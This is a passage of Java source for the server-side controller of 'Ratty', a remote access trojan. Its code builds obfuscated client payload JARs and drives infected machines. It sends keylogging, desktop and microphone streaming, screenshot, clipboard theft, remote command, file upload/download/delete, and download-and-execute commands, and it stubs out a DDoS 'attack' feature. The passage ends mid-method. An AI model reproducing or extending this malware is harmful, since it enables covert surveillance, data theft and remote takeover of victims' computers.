/*******************************************************************************
 * Copyright 2016 Johannes Boczek
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *******************************************************************************/

package de.sogomn.rat.gui;

import static de.sogomn.rat.util.Constants.LANGUAGE;

import java.awt.event.MouseEvent;
import java.awt.image.BufferedImage;
import java.io.File;
import java.net.URL;
import java.nio.file.Path;
import java.text.SimpleDateFormat;
import java.util.Base64;
import java.util.Collection;
import java.util.HashMap;
import java.util.Set;
import java.util.stream.Collectors;
import java.util.stream.Stream;

import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import javax.swing.JOptionPane;

import org.jnativehook.keyboard.NativeKeyEvent;

import de.sogomn.engine.fx.Sound;
import de.sogomn.engine.util.FileUtils;
import de.sogomn.rat.ActiveConnection;
import de.sogomn.rat.packet.AudioPacket;
import de.sogomn.rat.packet.ChatPacket;
import de.sogomn.rat.packet.ClipboardPacket;
import de.sogomn.rat.packet.CommandPacket;
import de.sogomn.rat.packet.ComputerInfoPacket;
import de.sogomn.rat.packet.DeleteFilePacket;
import de.sogomn.rat.packet.DesktopPacket;
import de.sogomn.rat.packet.DownloadFilePacket;
import de.sogomn.rat.packet.DownloadUrlPacket;
import de.sogomn.rat.packet.ExecuteFilePacket;
import de.sogomn.rat.packet.FileInformationPacket;
import de.sogomn.rat.packet.FileRequestPacket;
import de.sogomn.rat.packet.FreePacket;
import de.sogomn.rat.packet.IPacket;
import de.sogomn.rat.packet.InformationPacket;
import de.sogomn.rat.packet.KeyEventPacket;
import de.sogomn.rat.packet.KeylogPacket;
import de.sogomn.rat.packet.MouseEventPacket;
import de.sogomn.rat.packet.NewDirectoryPacket;
import de.sogomn.rat.packet.PingPacket;
import de.sogomn.rat.packet.PopupPacket;
import de.sogomn.rat.packet.RestartPacket;
import de.sogomn.rat.packet.RootRequestPacket;
import de.sogomn.rat.packet.ScreenshotPacket;
import de.sogomn.rat.packet.ShutdownPacket;
import de.sogomn.rat.packet.UninstallPacket;
import de.sogomn.rat.packet.UploadFilePacket;
import de.sogomn.rat.packet.VoicePacket;
import de.sogomn.rat.packet.WebsitePacket;
import de.sogomn.rat.server.AbstractRattyController;
import de.sogomn.rat.server.ActiveServer;
import de.sogomn.rat.util.FrameEncoder.Frame;
import de.sogomn.rat.util.JarBuilder;
import de.sogomn.rat.util.Resources;
import de.sogomn.rat.util.XorCipher;

/*
 * Woah, this is a huge class.
 * I know, I should have one controller for each GUI, but... You know... Nope.
 * There will a point where I gotta do all the refactoring. Damn that's gonna be fun.
 */
public final class RattyGuiController extends AbstractRattyController implements IGuiController {
	
	private IRattyGuiFactory guiFactory;
	private IRattyGui gui;
	private IBuilderGui builder;
	private IServerListGui serverList;
	
	private File selectedBuilderFile;
	
	private HashMap<ActiveConnection, ServerClient> clients;
	private long lastServerStart;
	
	private long lastMouseMotion;
	
	private static final String BUILDER_DATA_REPLACEMENT = "data";
	private static final String BUILDER_DATA_REPLACEMENT_FORMAT = "%s:%s";
	private static final String BUILDER_MANIFEST_REPLACEMENT = "META-INF/MANIFEST.MF";
	private static final byte[] BUILDER_MANIFEST_REPLACEMENT_DATA = ("Manifest-Version: 1.0" + System.lineSeparator() + "Class-Path: ." + System.lineSeparator() + "Main-Class: de.sogomn.rat.RattyClient" + System.lineSeparator() + System.lineSeparator()).getBytes();
	private static final String[] BUILDER_REMOVALS = {
		"ping.wav",
		"lato.ttf",
		"icons.png",
		
		"language/lang_de.properties",
		"language/lang_en.properties",
		"language/lang_es.properties",
		"language/lang_nl.properties",
		"language/lang_ru.properties",
		"language/lang_tr.properties",
		"language/lang_uk.properties",
		"language/lang_pl.properties",
		"language/lang_dk.properties",
		"language/lang_it.properties",
		"language/lang_sv.properties",
		"language/lang_pt.properties",
		"language/lang_fr.properties",
		"language/lang_ro.properties",
		"language/lang_sr.properties",
		"language/lang_sr_Latn.properties",
		
		"de/sogomn/rat/RattyServer.class",
		
		"de/sogomn/rat/server/AbstractRattyController.class",
		"de/sogomn/rat/server/ActiveServer.class",
		"de/sogomn/rat/server/IServerObserver.class",
		
		"de/sogomn/rat/gui/IServerListGui.class",
		"de/sogomn/rat/gui/IRattyGui.class",
		"de/sogomn/rat/gui/IFileBrowserGui.class",
		"de/sogomn/rat/gui/IBuilderGui.class",
		"de/sogomn/rat/gui/INotificationGui.class",
		"de/sogomn/rat/gui/ServerClient.class",
		"de/sogomn/rat/gui/RattyGuiController.class",
		
		"de/sogomn/rat/gui/swing/BuilderSwingGui.class",
		"de/sogomn/rat/gui/swing/DisplaySwingGui.class",
		"de/sogomn/rat/gui/swing/FileBrowserSwingGui.class",
		"de/sogomn/rat/gui/swing/LoggingSwingGui.class",
		"de/sogomn/rat/gui/swing/NotificationSwingGui.class",
		"de/sogomn/rat/gui/swing/RattySwingGui.class",
		"de/sogomn/rat/gui/swing/RattySwingGuiFactory.class",
		"de/sogomn/rat/gui/swing/ServerClientTableModel.class",
		"de/sogomn/rat/gui/swing/ServerListSwingGui.class"
	};
	
	private static final String FREE_WARNING = LANGUAGE.getString("server.free_warning");
	private static final String UNINSTALL_WARNING = LANGUAGE.getString("server.uninstall_warning");
	private static final String YES = LANGUAGE.getString("server.yes");
	private static final String NO = LANGUAGE.getString("server.no");
	private static final String CANCEL = LANGUAGE.getString("server.cancel");
//	private static final String OPTION_TCP = LANGUAGE.getString("server.tcp");
//	private static final String OPTION_UDP = LANGUAGE.getString("server.udp");
//	private static final String ATTACK_MESSAGE = LANGUAGE.getString("server.attack_message");
	private static final String BUILDER_ERROR_MESSAGE = LANGUAGE.getString("server.error");
	private static final String URL_MESSAGE = LANGUAGE.getString("server.url_message");
	private static final String AMOUNT_QUESTION = LANGUAGE.getString("server.amount_question");
	private static final String FILE_NAME = LANGUAGE.getString("file_information.name");
	private static final String FILE_PATH = LANGUAGE.getString("file_information.path");
	private static final String FILE_SIZE = LANGUAGE.getString("file_information.size");
	private static final String FILE_DIRECTORY = LANGUAGE.getString("file_information.directory");
	private static final String FILE_CREATION = LANGUAGE.getString("file_information.creation");
	private static final String FILE_LAST_ACCESS = LANGUAGE.getString("file_information.last_access");
	private static final String FILE_LAST_MODIFICATION = LANGUAGE.getString("file_information.last_modification");
	private static final String FILE_BYTES = LANGUAGE.getString("file_information.bytes");
	private static final String USER_NAME = LANGUAGE.getString("information.user_name");
	private static final String HOST_NAME = LANGUAGE.getString("information.host_name");
	private static final String OS_NAME = LANGUAGE.getString("information.os_name");
	private static final String OS_ARCHITECTURE = LANGUAGE.getString("information.os_architecture");
	private static final String PROCESSORS = LANGUAGE.getString("information.processors");
	private static final String RAM = LANGUAGE.getString("information.ram");
	
	private static final String FLAG_ADDRESS = "http://www.geojoe.co.uk/api/flag/?ip=";
	private static final String KEY_MODIFIER_TEXT_FORMAT = "   [%s]   ";
	private static final String SEPARATOR = "/";
	private static final long PING_INTERVAL = 5000;
	private static final long NOTIFICATION_DELAY = 7500;
	private static final String ARROW_CHARACTER = "\u2191";
	private static final long MOUSE_MOTION_INTERVAL = 100;
	
	private static final Sound PING = Sound.loadSound("/ping.wav");
	
	static {
		PING.setGain(-7.5f);
		PING.setSampleRate(35000);
	}
	
	public RattyGuiController(final IRattyGuiFactory guiFactory) {
		this.guiFactory = guiFactory;
		
		final Thread pingThread = new Thread(() -> {
			while (true) {
				final PingPacket packet = new PingPacket();
				
				broadcast(packet);
				
				try {
					Thread.sleep(PING_INTERVAL);
				} catch (final Exception ex) {
					ex.printStackTrace();
				}
			}
		}, "Ping");
		
		gui = guiFactory.createRattyGui();
		builder = guiFactory.createBuilderGui();
		serverList = guiFactory.createServerListGui();
		clients = new HashMap<ActiveConnection, ServerClient>();
		
		serverList.addListener(this);
		serverList.setIcons(Resources.WINDOW_ICON_LIST);
		builder.addListener(this);
		builder.setIcons(Resources.WINDOW_ICON_LIST);
		gui.addListener(this);
		gui.setVisible(true);
		
		pingThread.setPriority(Thread.MIN_PRIORITY);
		pingThread.setDaemon(true);
		pingThread.start();
	}
	
	/*
	 * ==================================================
	 * HANDLING COMMANDS
	 * ==================================================
	 */
	
	private PopupPacket createPopupPacket() {
		final String input = gui.getInput();
		
		if (input != null) {
			final PopupPacket packet = new PopupPacket(input);
			
			return packet;
		}
		
		return null;
	}
	
	private CommandPacket createCommandPacket() {
		final String input = gui.getInput();
		
		if (input != null) {
			final CommandPacket packet = new CommandPacket(input);
			
			return packet;
		}
		
		return null;
	}
	
	private WebsitePacket createWebsitePacket() {
		final String input = gui.getInput(URL_MESSAGE);
		
		if (input == null) {
			return null;
		}
		
		final String numberInput = gui.getInput(AMOUNT_QUESTION);
		final int number;
		
		try {
			number = Integer.parseInt(numberInput);
		} catch (final NumberFormatException ex) {
			return null;
		}
		
		final WebsitePacket packet = new WebsitePacket(input, number);
		
		return packet;
	}
	
	private AudioPacket createAudioPacket() {
		final File file = gui.getOpenFile("WAV");
		
		if (file != null) {
			final String path = file.getAbsolutePath();
			final byte[] data = FileUtils.readExternalData(path);
			final AudioPacket packet = new AudioPacket(data);
			
			return packet;
		}
		
		return null;
	}
	
	private DownloadFilePacket createDownloadPacket(final ServerClient client) {
		final String path = client.fileBrowser.getSelectedFilePath();
		final DownloadFilePacket packet = new DownloadFilePacket(path);
		
		return packet;
	}
	
	private UploadFilePacket createUploadPacket(final ServerClient client) {
		final File file = client.fileBrowser.getOpenFile();
		
		if (file != null) {
			final String fileName = file.getName();
			final String filePath = file.getAbsolutePath();
			final byte[] data = FileUtils.readExternalData(filePath);
			final String path = client.fileBrowser.getCurrentDirectoryPath() + SEPARATOR + fileName;
			final UploadFilePacket packet = new UploadFilePacket(path, data);
			
			return packet;
		}
		
		return null;
	}
	
	private ExecuteFilePacket createExecutePacket(final ServerClient client) {
		final String path = client.fileBrowser.getSelectedFilePath();
		final ExecuteFilePacket packet = new ExecuteFilePacket(path);
		
		return packet;
	}
	
	private DeleteFilePacket createDeletePacket(final ServerClient client) {
		final String path = client.fileBrowser.getSelectedFilePath();
		final DeleteFilePacket packet = new DeleteFilePacket(path);
		
		return packet;
	}
	
	private NewDirectoryPacket createDirectoryPacket(final ServerClient client) {
		final String input = client.fileBrowser.getInput();
		
		if (input != null) {
			final String path = client.fileBrowser.getCurrentDirectoryPath() + SEPARATOR + input;
			final NewDirectoryPacket packet = new NewDirectoryPacket(path);
			
			return packet;
		}
		
		return null;
	}
	
	private FreePacket createFreePacket() {
		final int input = gui.showWarning(FREE_WARNING, YES, CANCEL);
		
		if (input == JOptionPane.YES_OPTION) {
			final FreePacket packet = new FreePacket();
			
			return packet;
		}
		
		return null;
	}
	
	private DownloadUrlPacket createDownloadUrlPacket(final ServerClient client) {
		final String address = client.fileBrowser.getInput(URL_MESSAGE);
		
		if (address != null) {
			final String path = client.fileBrowser.getCurrentDirectoryPath();
			final DownloadUrlPacket packet = new DownloadUrlPacket(address, path);
			
			return packet;
		}
		
		return null;
	}
	
	private FileInformationPacket createFileInformationPacket(final ServerClient client) {
		final String path = client.fileBrowser.getSelectedFilePath();
		final FileInformationPacket packet = new FileInformationPacket(path);
		
		return packet;
	}
	
	private UploadFilePacket createUploadExecutePacket(final ServerClient client) {
		final File file = gui.getOpenFile();
		
		if (file != null) {
			final String fileName = file.getName();
			final String filePath = file.getAbsolutePath();
			final byte[] data = FileUtils.readExternalData(filePath);
			final UploadFilePacket packet = new UploadFilePacket(fileName, data, true);
			
			return packet;
		}
		
		return null;
	}
	
	private DownloadUrlPacket createDropExecutePacket(final ServerClient client) {
		final String address = gui.getInput(URL_MESSAGE);
		
		if (address != null) {
			final DownloadUrlPacket packet = new DownloadUrlPacket(address, "", true);
			
			return packet;
		}
		
		return null;
	}
	
	private ChatPacket createChatPacket(final ServerClient client) {
		final String message = client.chat.getMessageInput();
		final ChatPacket packet = new ChatPacket(message);
		
		return packet;
	}
	
	private UninstallPacket createUninstallPacket() {
		final int input = gui.showWarning(UNINSTALL_WARNING, YES, CANCEL);
		
		if (input == JOptionPane.YES_OPTION) {
			final UninstallPacket packet = new UninstallPacket();
			
			return packet;
		}
		
		return null;
	}
	
	private void toggleDesktopStream(final ServerClient client) {
		final boolean streamingDesktop = client.isStreamingDesktop();
		
		client.setStreamingDesktop(!streamingDesktop);
		gui.update();
	}
	
	private void stopDesktopStream(final ServerClient client) {
		client.setStreamingDesktop(false);
		gui.update();
	}
	
	private void toggleVoiceStream(final ServerClient client) {
		final boolean streamingVoice = client.isStreamingVoice();
		
		client.setStreamingVoice(!streamingVoice);
		gui.update();
	}
	
	private FileRequestPacket createFileRequestPacket(final ServerClient client) {
		final String file = client.fileBrowser.getSelectedFile();
		final boolean directory = client.fileBrowser.isDirectory(file);
		
		if (!directory) {
			return null;
		}
		
		final String path = client.fileBrowser.getSelectedFilePath();
		final FileRequestPacket packet = new FileRequestPacket(path);
		
		client.fileBrowser.clearFiles();
		client.fileBrowser.setDirectoryPath(path);
		
		return packet;
	}
	
	private void launchAttack() {
		gui.showMessage("Not implemented yet");//TODO
		
//		final int input = gui.showOptions(ATTACK_MESSAGE, OPTION_TCP, OPTION_UDP, CANCEL);
//		
//		final AttackPacket packet = null;
//		
//		if (input == JOptionPane.YES_OPTION) {
//			//packet = new AttackPacket(AttackPacket.TCP, address, port, duration);
//		} else if (input == JOptionPane.NO_OPTION) {
//			//packet = new AttackPacket(AttackPacket.UDP, address, port, duration);
//		} else {
//			return;
//		}
//		
//		broadcast(packet);
	}
	
	private void build() {
		final String[] entries = builder.getListEntries();
		
		if (selectedBuilderFile == null || entries.length == 0) {
			return;
		}
		
		final String dataReplacementString = Stream.of(entries).collect(Collectors.joining("\r\n"));
		
		byte[] dataReplacement = dataReplacementString.getBytes();
		dataReplacement = XorCipher.crypt(dataReplacement);
		dataReplacement = Base64.getEncoder().encode(dataReplacement);
		
		
		final Path path = selectedBuilderFile.toPath();
		final JarBuilder jarBuilder = new JarBuilder(path);
		
		jarBuilder.replaceFile(BUILDER_DATA_REPLACEMENT, dataReplacement);
		jarBuilder.replaceFile(BUILDER_MANIFEST_REPLACEMENT, BUILDER_MANIFEST_REPLACEMENT_DATA);
		jarBuilder.removeFiles(BUILDER_REMOVALS);
		
		try {
			jarBuilder.build();
		} catch (final Exception ex) {
			gui.showError(BUILDER_ERROR_MESSAGE + System.lineSeparator() + ex);
		}
		
		builder.clearListEntries();
		builder.setVisible(false);
	}
	
	private void selectBuilderFile() {
		selectedBuilderFile = builder.getSaveFile("JAR");
		
		if (selectedBuilderFile != null) {
			final String name = selectedBuilderFile.getName();
			
			builder.setFileName(name);
		} else {
			builder.setFileName(IBuilderGui.NO_FILE);
		}
	}
	
	private void addBuilderEntry() {
		final String address = builder.getAddressInput();
		final String port = builder.getPortInput();
		
		if (address == null || port == null || address.isEmpty() || port.isEmpty()) {
			return;
		}
		
		final String entry = String.format(BUILDER_DATA_REPLACEMENT_FORMAT, address, port);
		
		builder.addListEntry(entry);
		builder.setAddressInput("");
		builder.setPortInput("");
	}
	
	private void removeBuilderEntry() {
		final String selectedEntry = builder.getSelectedListEntry();
		
		builder.removeListEntry(selectedEntry);
	}
	
	private void exit() {
		final Collection<ServerClient> clientSet = clients.values();
		
		for (final ServerClient client : clientSet) {
			client.removeAllListeners();
			client.logOut();
		}
		
		clients.clear();
		
		for (final ActiveConnection connection : connections) {
			connection.setObserver(null);
			connection.close();
		}
		
		connections.clear();
		
		for (final ActiveServer server : servers) {
			server.setObserver(null);
			server.close();
		}
		
		serverList.removeAllListeners();
		serverList.close();
		builder.removeAllListeners();
		builder.close();
		gui.removeAllListeners();
		gui.close();
		servers.clear();
		
		System.exit(0);
	}
	
	private void startServer() {
		final String portString = serverList.getPortInput();
		
		try {
			final int port = Integer.parseInt(portString);
			
			/*65535 = Max port*/
			if (port <= 0 || port > 65535) {
				return;
			}
			
			startServer(port);
		} catch (final Exception ex) {
			//...
		}
	}
	
	private void stopServer() {
		final String portString = serverList.getSelectedItem();
		
		try {
			final int port = Integer.parseInt(portString);
			
			stopServer(port);
		} catch (final Exception ex) {
			//...
		}
	}
	
	private void browseFiles(final ServerClient client) {
		final RootRequestPacket packet = new RootRequestPacket();
		
		client.fileBrowser.clearRoots();
		client.connection.addPacket(packet);
		client.fileBrowser.setVisible(true);
	}
	
	private void fileBrowserDirectoryUp(final ServerClient client) {
		final String directory = client.fileBrowser.getParentDirectory();
		
		if (directory == null) {
			return;
		}
		
		final FileRequestPacket packet = new FileRequestPacket(directory);
		
		client.fileBrowser.clearFiles();
		client.fileBrowser.setDirectoryPath(directory);
		client.connection.addPacket(packet);
	}
	
	private MouseEventPacket createMouseEventPacket(final ServerClient client, final boolean flag) {
		if (!client.isStreamingDesktop()) {
			return null;
		}
		
		final int x = client.displayPanel.getMouseX();
		final int y = client.displayPanel.getMouseY();
		final int button = client.displayPanel.getMouseButtonInput();
		final byte strokeType = flag ? MouseEventPacket.PRESS : MouseEventPacket.RELEASE;
		final MouseEventPacket packet = new MouseEventPacket(x, y, button, strokeType);
		
		return packet;
	}
	
	private KeyEventPacket createKeyEventPacket(final ServerClient client, final boolean flag) {
		if (!client.isStreamingDesktop()) {
			return null;
		}
		
		final int key = client.displayPanel.getKeyboardKeyInput();
		final byte strokeType = flag ? KeyEventPacket.PRESS : KeyEventPacket.RELEASE;
		final KeyEventPacket packet = new KeyEventPacket(key, strokeType);
		
		return packet;
	}
	
	private FileRequestPacket createRootRequestPacket(final ServerClient client) {
		final String root = client.fileBrowser.getSelectedRoot();
		
		if (root == null) {
			return null;
		}
		
		final FileRequestPacket packet = new FileRequestPacket(root);
		
		client.fileBrowser.clearFiles();
		client.fileBrowser.setDirectoryPath(root);
		
		return packet;
	}
	
	private void refreshFileBrowser(final ServerClient client) {
		final String path = client.fileBrowser.getCurrentDirectoryPath();
		final FileRequestPacket packet = new FileRequestPacket(path);
		
		client.fileBrowser.clearFiles();
		client.connection.addPacket(packet);
	}
	
	private MouseEventPacket createMouseMovementPacket(final ServerClient client) {
		if (System.currentTimeMillis() - lastMouseMotion < MOUSE_MOTION_INTERVAL || !client.isStreamingDesktop()) {
			return null;
		}
		
		final int x = client.displayPanel.getMouseX();
		final int y = client.displayPanel.getMouseY();
		final MouseEventPacket packet = new MouseEventPacket(x, y, MouseEvent.NOBUTTON, MouseEventPacket.MOVE);
		
		lastMouseMotion = System.currentTimeMillis();
		
		return packet;
	}
	
	/*
	 * ==================================================
	 * HANDLING COMMANDS END
	 * ==================================================
	 */
	
	private void handleCommand(final ServerClient client, final String command) {
		if (command == IRattyGui.BROWSE_FILES) {
			browseFiles(client);
		} else if (command == IDisplayGui.CLOSE) {
			stopDesktopStream(client);
		} else if (command == IRattyGui.DESKTOP) {
			toggleDesktopStream(client);
		} else if (command == IRattyGui.VOICE) {
			toggleVoiceStream(client);
		} else if (command == IRattyGui.CHAT) {
			client.chat.setVisible(true);
		} else if (command == IRattyGui.KEYLOG) {
			client.logger.setVisible(true);
		} else if (command == ILoggingGui.CLEAR) {
			client.logger.clear();
		} else if (command == IFileBrowserGui.DIRECTORY_UP) {
			fileBrowserDirectoryUp(client);
		} else if (command == IFileBrowserGui.DELETE) {
			refreshFileBrowser(client);
		} else if (command == IFileBrowserGui.DROP_FILE) {
			refreshFileBrowser(client);
		} else if (command == IFileBrowserGui.NEW_DIRECTORY) {
			refreshFileBrowser(client);
		} else if (command == IFileBrowserGui.UPLOAD) {
			refreshFileBrowser(client);
		}
	}
	
	private void handleGlobalCommand(final String command) {
		if (command == IRattyGui.CLOSE) {
			exit();
		} else if (command == IRattyGui.BUILD) {
			builder.setVisible(true);
		} else if (command == IBuilderGui.CHOOSE) {
			selectBuilderFile();
		} else if (command == IBuilderGui.BUILD) {
			build();
		} else if (command == IRattyGui.ATTACK) {
			launchAttack();
		} else if (command == IBuilderGui.ADD) {
			addBuilderEntry();
		} else if (command == IBuilderGui.REMOVE) {
			removeBuilderEntry();
		} else if (command == IRattyGui.MANAGE_SERVERS) {
			serverList.setVisible(true);
		} else if (command == IServerListGui.START) {
			startServer();
		} else if (command == IServerListGui.STOP) {
			stopServer();
		}
	}
	
	private IPacket createPacket(final ServerClient client, final String command) {
		IPacket packet = null;
		
		if (command == IRattyGui.FREE) {
			packet = createFreePacket();
		} else if (command == IRattyGui.POPUP) {
			packet = createPopupPacket();
		} else if (command == IRattyGui.CLIPBOARD) {
			packet = new ClipboardPacket();
		} else if (command == IRattyGui.COMMAND) {
			packet = createCommandPacket();
		} else if (command == IRattyGui.SCREENSHOT) {
			packet = new ScreenshotPacket();
		} else if (command == IRattyGui.WEBSITE) {
			packet = createWebsitePacket();
		} else if (command == IRattyGui.DESKTOP) {
			packet = new DesktopPacket(true);
		} else if (command == IRattyGui.AUDIO) {
			packet = createAudioPacket();
		} else if (command == IFileBrowserGui.DOWNLOAD) {
			packet = createDownloadPacket(client);
		} else if (command == IFileBrowserGui.UPLOAD) {
			packet = createUploadPacket(client);
		} else if (command == IFileBrowserGui.EXECUTE) {
			packet = createExecutePacket(client);
		} else if (command == IFileBrowserGui.DELETE) {
			packet = createDeletePacket(client);
		} else if (command == IFileBrowserGui.NEW_DIRECTORY) {
			packet = createDirectoryPacket(client);
		} else if (command == IFileBrowserGui.DROP_FILE) {
			packet = createDownloadUrlPacket(client);
		} else if (command == IRattyGui.UPLOAD_EXECUTE) {
			packet = createUploadExecutePacket(client);
		} else if (command == IRattyGui.DROP_EXECUTE) {
			packet = createDropExecutePacket(client);
		} else if (command == IChatGui.MESSAGE_SENT) {
			packet = createChatPacket(client);
		} else if (command == IFileBrowserGui.INFORMATION) {
			packet = createFileInformationPacket(client);
		} else if (command == IRattyGui.INFORMATION) {
			packet = new ComputerInfoPacket();
		} else if (command == IRattyGui.UNINSTALL) {
			packet = createUninstallPacket();
		} else if (command == IRattyGui.SHUT_DOWN) {
			packet = new ShutdownPacket();
		} else if (command == IDisplayGui.MOUSE_PRESSED) {
			packet = createMouseEventPacket(client, true);
		} else if (command == IDisplayGui.MOUSE_RELEASED) {
			packet = createMouseEventPacket(client, false);
		} else if (command == IDisplayGui.KEY_PRESSED) {
			packet = createKeyEventPacket(client, true);
		} else if (command == IDisplayGui.KEY_RELEASED) {
			packet = createKeyEventPacket(client, false);
		} else if (command == IRattyGui.VOICE && !client.isStreamingVoice()) {
			packet = new VoicePacket();
		} else if (command == IRattyGui.RESTART) {
			packet = new RestartPacket();
		} else if (command == IFileBrowserGui.REQUEST_ROOT) {
			packet = createRootRequestPacket(client);
		} else if (command == IFileBrowserGui.REQUEST) {
			packet = createFileRequestPacket(client);
		} else if (command == IDisplayGui.MOUSE_MOVED) {
			packet = createMouseMovementPacket(client);
		}
		
		return packet;
	}
	
	/*
	 * ==================================================
	 * HANDLING PACKETS
	 * ==================================================
	 */
	
	private void showScreenshot(final ServerClient client, final ScreenshotPacket packet) {
		final BufferedImage image = packet.getImage();
		
		client.displayPanel.showImage(image);
	}
	
	private void handleFiles(final ServerClient client, final FileRequestPacket packet) {
		final String[] filePaths = packet.getFilePaths();
		final String[] directoryPaths = packet.getDirectoryPaths();
		
		for (final String file : filePaths) {
			client.fileBrowser.addFilePath(file);
		}
		
		for (final String directory : directoryPaths) {
			client.fileBrowser.addDirectoryPath(directory);
		}
		
		client.fileBrowser.update();
	}
	
	private void handleDesktopPacket(final ServerClient client, final DesktopPacket packet) {
		if (!client.isStreamingDesktop()) {
			return;
		}
		
		final Frame[] frames = packet.getFrames();
		final int screenWidth = packet.getScreenWidth();
		final int screenHeight = packet.getScreenHeight();
		final DesktopPacket request = new DesktopPacket();
		
		client.connection.addPacket(request);
		client.displayPanel.showFrames(screenWidth, screenHeight, frames);
	}
	
	private void handleClipboardPacket(final ClipboardPacket packet) {
		final String message = packet.getClipbordContent();
		
		gui.showMessage(message);
	}
	
	private void handleVoicePacket(final ServerClient client, final VoicePacket packet) {
		if (!client.isStreamingVoice()) {
			return;
		}
		
		final Sound sound = packet.getSound();
		final VoicePacket request = new VoicePacket();
		
		client.connection.addPacket(request);
		sound.play();
	}
	
	private void handlePing(final ServerClient client, final PingPacket packet) {
		final long milliseconds = packet.getMilliseconds();
		
		client.setPing(milliseconds);
		gui.update();
	}
	
	private void handleChatPacket(final ServerClient client, final ChatPacket packet) {
		final String message = packet.getMessage();
		final String name = client.getName();
		
		client.chat.appendLine(name + ": " + message);
	}
	
	private void handleFileInformation(final ServerClient client, final FileInformationPacket packet) {
		final String name = packet.getName();
		final String path = packet.getPath();
		final long size = packet.getSize();
		final boolean directory = packet.isDirectory();
		final long creationTime = packet.getCreationTime();
		final long lastAccess = packet.getLastAccess();
		final long lastModified = packet.getLastModified();
		final SimpleDateFormat dateFormat = new SimpleDateFormat();
		final String creationDate = dateFormat.format(creationTime);
		final String lastAccessDate = dateFormat.format(lastAccess);
		final String lastModificationDate = dateFormat.format(lastModified);
		final String directoryString = directory ? YES : NO;
		final StringBuilder builder = new StringBuilder();
		final String message = builder
				.append(FILE_NAME).append(": ").append(name).append("\r\n")
				.append(FILE_PATH).append(": ").append(path).append("\r\n")
				.append(FILE_SIZE).append(": ").append(size).append(" ").append(FILE_BYTES).append("\r\n")
				.append(FILE_DIRECTORY).append(": ").append(directoryString).append("\r\n")
				.append(FILE_CREATION).append(": ").append(creationDate).append("\r\n")
				.append(FILE_LAST_ACCESS).append(": ").append(lastAccessDate).append("\r\n")
				.append(FILE_LAST_MODIFICATION).append(": ").append(lastModificationDate)
				.toString();
		
		client.fileBrowser.showMessage(message);
	}
	
	private void handleInfoPacket(final ComputerInfoPacket packet) {
		final String name = packet.getName();
		final String hostName = packet.getHostName();
		final String os = packet.getOs();
		final String osVersion = packet.getOsVersion();
		final String osArchitecture = packet.getOsArchitecture();
		final int processors = packet.getProcessors();
		final long ram = packet.getRam();
		final StringBuilder builder = new StringBuilder();
		
		final String message = builder
				.append(USER_NAME).append(": ").append(name).append("\r\n")
				.append(HOST_NAME).append(": ").append(hostName).append("\r\n")
				.append(OS_NAME).append(": ").append(os).append(" ").append(osVersion).append("\r\n")
				.append(OS_ARCHITECTURE).append(": ").append(osArchitecture).append("\r\n")
				.append(PROCESSORS).append(": ").append(processors).append("\r\n")
				.append(RAM).append(": ").append(ram).append(" ").append(FILE_BYTES).append("\r\n")
				.toString();
		
		gui.showMessage(message);
	}
	
	private void handleKeylog(final ServerClient client, final KeylogPacket packet) {
		final int keyCode = packet.getKeyCode();
		final boolean pressed = packet.getFlag() == KeylogPacket.PRESSED;
		
		String message = NativeKeyEvent.getKeyText(keyCode);
		
		if (message.length() > 1) {
			if (!pressed) {
				message += ARROW_CHARACTER;
			}
			
			message = String.format(KEY_MODIFIER_TEXT_FORMAT, message);
		} else if (!pressed) {
			return;
		}
		
		client.logger.log(message);
	}
	
	private void handleRoots(final ServerClient client, final RootRequestPacket packet) {
		final String[] roots = packet.getRoots();
		
		for (final String root : roots) {
			client.fileBrowser.addRoot(root);
		}
		
		client.fileBrowser.update();
	}
	
	private boolean handlePacket(final ServerClient client, final IPacket packet) {
		final Class<? extends IPacket> clazz = packet.getClass();
		
		boolean consumed = true;
		
		if (clazz == ScreenshotPacket.class) {
			final ScreenshotPacket screenshot = (ScreenshotPacket)packet;
			
			showScreenshot(client, screenshot);
		} else if (clazz == FileRequestPacket.class) {
			final FileRequestPacket request = (FileRequestPacket)packet;
			
			handleFiles(client, request);
		} else if (clazz == DesktopPacket.class) {
			final DesktopPacket desktop = (DesktopPacket)packet;
			
			handleDesktopPacket(client, desktop);
		} else if (clazz == ClipboardPacket.class) {
			final ClipboardPacket clipboard = (ClipboardPacket)packet;
			
			handleClipboardPacket(clipboard);
		} else if (clazz == VoicePacket.class) {
			final VoicePacket voice = (VoicePacket)packet;
			
			handleVoicePacket(client, voice);
		} else if (clazz == PingPacket.class) {
			final PingPacket ping = (PingPacket)packet;
			
			handlePing(client, ping);
		} else if (clazz == ChatPacket.class) {
			final ChatPacket chat = (ChatPacket)packet;
			
			handleChatPacket(client, chat);
		} else if (clazz == ComputerInfoPacket.class) {
			final ComputerInfoPacket info = (ComputerInfoPacket)packet;
			
			handleInfoPacket(info);
		} else if (clazz == FileInformationPacket.class) {
			final FileInformationPacket information = (FileInformationPacket)packet;
			
			handleFileInformation(client, information);
		} else if (clazz == KeylogPacket.class) {
			final KeylogPacket log = (KeylogPacket)packet;
			
			handleKeylog(client, log);
		} else if (clazz == RootRequestPacket.class) {
			final RootRequestPacket root = (RootRequestPacket)packet;
			
			handleRoots(client, root);
		} else if (clazz == FreePacket.class || clazz == ShutdownPacket.class || clazz == RestartPacket.class) {
			//To prevent them from executing
		} else {
			consumed = false;
		}
		
		return consumed;
	}
	
	/*
	 * ==================================================
	 * HANDLING PACKETS END
	 * ==================================================
	 */
	
	private ImageIcon getFlagIcon(final String address) {
		try {
			final String requestAddress = FLAG_ADDRESS + address;
			final URL url = new URL(requestAddress);
			final BufferedImage image = ImageIO.read(url);
			final ImageIcon icon = new ImageIcon(image);
			
			return icon;
		} catch (final Exception ex) {
			return null;
		}
	}
	
	private void logIn(final ServerClient client, final InformationPacket packet) {
		final String name = packet.getName();
		final String os = packet.getOs();
		final String version = packet.getVersion();
		final String address = client.getAddress();
		final ImageIcon icon = getFlagIcon(address);
		final boolean shouldNotify = System.currentTimeMillis() - lastServerStart > NOTIFICATION_DELAY;
		
		client.logIn(name, os, version, icon);
		client.addListener(this);
		
		gui.addClient(client);
		gui.update();
		
		if (shouldNotify) {
